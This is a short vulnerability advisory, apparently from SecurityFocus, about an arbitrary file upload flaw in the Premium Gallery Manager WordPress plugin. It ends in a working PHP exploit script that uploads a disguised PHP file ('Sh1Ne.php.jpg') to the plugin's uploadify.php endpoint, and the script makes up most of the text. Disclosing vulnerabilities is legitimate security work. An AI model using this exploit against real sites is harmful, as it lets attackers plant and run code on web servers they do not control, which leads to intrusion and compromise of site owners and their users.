source: http://www.securityfocus.com/bid/66044/info

Premium Gallery Manager plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks may also possible. 

<?php
$uploadfile="Sh1Ne.php.jpg";
$ch =
curl_init("http://www.example.com/wp-content/plugins/Premium_Gallery_Manager/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('Filedata'=>"@$uploadfile", 
'folder'=>'/wp-content/plugins/Premium_Gallery_Manager/uploadify/'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult"; 
?>